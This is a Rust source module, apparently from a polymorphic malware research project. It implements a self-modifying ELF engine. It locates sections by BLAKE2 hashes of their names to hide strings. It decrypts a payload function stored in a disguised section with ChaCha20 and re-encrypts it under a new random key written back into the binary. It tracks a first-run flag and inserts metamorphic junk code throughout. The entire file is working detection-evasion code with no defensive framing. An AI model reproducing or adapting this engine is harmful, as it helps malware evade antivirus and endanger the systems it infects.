#![allow(warnings)]
#![feature(asm)]

// https://github.com/PoCInnovation/Whitecomet-Research/
// https://github.com/PoCInnovation/Whitecomet-Research/blob/master/Polymorphic/Linux-ELF/src/main.c

use std::arch::asm;
use std::error::Error;

use rand;
use object::{File, Object, ObjectSection};
use chacha20::ChaCha20;
use chacha20::cipher::{KeyIvInit, StreamCipher, StreamCipherSeek};
use blake2::Blake2bVar;
use blake2::digest::{Update, VariableOutput};
use hex_literal::hex;

// modules
use crate::metamorphic;

// Payload function section size
pub const CRYPTED_FUNC_SIZE: usize = 1376;

/// Get ELF sections from specified hash.
///
/// # Arguments
///
/// * `file` - Opened file handle
/// * `hash` - Section hash to retrieve
///
/// # Return value
///
/// Section file offset range.
fn get_section(file: &File, hash: [u8; 32]) -> Option<(u64, u64)> {
    for section in file.sections() {
        metamorphic::junk!();
        match section.name() {
            Ok(n) if blake2_hash(n) == hash => {
                // println!("Hash of {} is:\n{:?}", n, blake2_hash(n));
                return section.file_range();
            }
            _ => {}
        }
        metamorphic::junk!();
    }
    None
}

/*
Hash of .lbss is:
[252, 78, 179, 82, 91, 208, 111, 29, 186, 26, 177, 66, 210, 26, 125, 235, 87, 234, 216, 251, 109, 255, 162, 112, 191, 198, 193, 24, 231, 68, 61, 161]
Hash of .hash is:
[51, 156, 110, 61, 72, 154, 233, 3, 211, 35, 229, 157, 118, 64, 216, 65, 206, 138, 71, 46, 214, 45, 112, 228, 170, 231, 85, 30, 11, 238, 1, 115]
Hash of .nsp0 is:
[255, 116, 245, 147, 148, 13, 79, 244, 92, 195, 196, 196, 182, 32, 15, 123, 232, 243, 68, 238, 182, 31, 172, 216, 31, 177, 73, 81, 198, 20, 35, 2]
Hash of .nsp1 is:
[233, 180, 130, 240, 56, 65, 54, 225, 133, 254, 111, 39, 116, 185, 57, 97, 245, 136, 132, 241, 60, 97, 151, 28, 113, 2, 229, 4, 131, 237, 76, 133]
*/

/// Blake2 hash function
///
/// # Arguments
///
/// * `name` - String to hash
///
/// # Return value
///
/// Hash string of input
fn blake2_hash(name: &str) -> [u8; 32] {
    // create a Blake2s256 object
    let mut hasher = Blake2bVar::new(32).unwrap(); metamorphic::junk!();

    // Update with input
    hasher.update(name.as_bytes()); metamorphic::junk!();

    // Return hex hash array
    let mut buf = [0u8; 32];
    hasher.finalize_variable(&mut buf).unwrap(); metamorphic::junk!();

    buf
}

/// Decrypt ELF section using key.
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `key` - Decryption key
/// * `nonce` - Decryption nonce
/// * `first` - first run bool
///
/// # Return value
///
/// Decrypted function as int array.
pub fn decrypt_func(code: &mut [u8], key: [u8; 32], nonce: [u8; 12], first: u8) -> Result<[u8; CRYPTED_FUNC_SIZE], Box<dyn Error>> {
    let mut decrypted_func: [u8; CRYPTED_FUNC_SIZE] = [0; CRYPTED_FUNC_SIZE]; metamorphic::junk!();

    let file = File::parse(&*code)?; metamorphic::junk!();

    // .hash section
    if let Some(range) = get_section(&file, hex!("339c6e3d489ae903d323e59d7640d841ce8a472ed62d70e4aae7551e0bee0173")) {
        // println!("CRYPTED_FUNC_SIZE: {}, {}", CRYPTED_FUNC_SIZE, range.1);
        assert_eq!(range.1 as usize, CRYPTED_FUNC_SIZE); metamorphic::junk!();
        let base = range.0 as usize;
        decrypted_func.copy_from_slice(&code[base..(base+CRYPTED_FUNC_SIZE)]); metamorphic::junk!();

        if first == 0 {
            first_run(code, first); metamorphic::junk!();
        } else {
            // Key and IV must be references to the `GenericArray` type.
            let mut cipher = ChaCha20::new(&key.into(), &nonce.into()); metamorphic::junk!();

            // apply keystream (decrypt)
            cipher.apply_keystream(&mut decrypted_func); metamorphic::junk!();
        }
    }

    Ok(decrypted_func)
}

/// Encrypt function using regenerated key.
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `decrypted_func` - Decrypted function array
///
/// # Return value
///
/// True if key is regenerated and encrypted function array with key is stored back into memory.
pub fn encrypt_func(code: &mut [u8], decrypted_func: &mut [u8; CRYPTED_FUNC_SIZE]) -> Result<(), Box<dyn Error>> {
    let mut key: [u8; 32] = [0; 32];
    let mut nonce: [u8; 12] = [0; 12];
    generate_key(code, &mut key, &mut nonce).ok(); metamorphic::junk!();

    let file = File::parse(&*code)?; metamorphic::junk!();

    // .hash section
    if let Some(range) = get_section(&file, hex!("339c6e3d489ae903d323e59d7640d841ce8a472ed62d70e4aae7551e0bee0173")) {
        assert_eq!(range.1 as usize, CRYPTED_FUNC_SIZE); metamorphic::junk!();
        let base = range.0 as usize;

        // Key and IV must be references to the `GenericArray` type.
        let mut cipher = ChaCha20::new(&key.into(), &nonce.into()); metamorphic::junk!();

        // apply keystream (encrypt)
        cipher.apply_keystream(decrypted_func); metamorphic::junk!();

        code[base..(base+CRYPTED_FUNC_SIZE)].copy_from_slice(decrypted_func); metamorphic::junk!();
    }

    Ok(())
}

/// Regenerate key randomly and store back into memory
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `key` - Encryption key
/// * `nonce` - Encryption nonce
///
/// # Return value
///
/// True if regenerated key is stored back into memory.
fn generate_key(code: &mut [u8], key: &mut [u8; 32], nonce: &mut [u8; 12]) -> Result<(), Box<dyn Error>> {
    for i in 0..key.len() {
        key[i] = rand::random::<u8>() % 255; metamorphic::junk!();
    }

    for i in 0..nonce.len() {
        nonce[i] = rand::random::<u8>() % 255; metamorphic::junk!();
    }

    let file = File::parse(&*code)?; metamorphic::junk!();

    // .nsp0 section
    if let Some(range) = get_section(&file, hex!("ff74f593940d4ff45cc3c4c4b6200f7be8f344eeb61facd81fb14951c6142302")) {
        assert_eq!(range.1 as usize, key.len()); metamorphic::junk!();
        let base = range.0 as usize;
        code[base..(base+key.len())].copy_from_slice(key); metamorphic::junk!();
    }

    let file = File::parse(&*code)?; metamorphic::junk!();

    // .nsp1 section
    if let Some(range) = get_section(&file, hex!("e9b482f0384136e185fe6f2774b93961f58884f13c61971c7102e50483ed4c85")) {
        assert_eq!(range.1 as usize, nonce.len()); metamorphic::junk!();
        let base = range.0 as usize;
        code[base..(base+nonce.len())].copy_from_slice(nonce); metamorphic::junk!();
    }

    Ok(())
}

/// Set first run bool as 1
///
/// # Arguments
///
/// * `code` - Binary file self
/// * `first` - first run bool
///
/// # Return value
///
/// True if bool is set to 1
fn first_run(code: &mut [u8], first: u8) -> Result<(), Box<dyn Error>> {
    let file = File::parse(&*code)?; metamorphic::junk!();

    // .lbss section
    if let Some(range) = get_section(&file, hex!("fc4eb3525bd06f1dba1ab142d21a7deb57ead8fb6dffa270bfc6c118e7443da1")) {
        assert_eq!(range.1, 1); metamorphic::junk!();
        let base = range.0 as usize;
        code[base..(base+1)].copy_from_slice(&(first + 1).to_ne_bytes()); metamorphic::junk!();
    }

    Ok(())
}

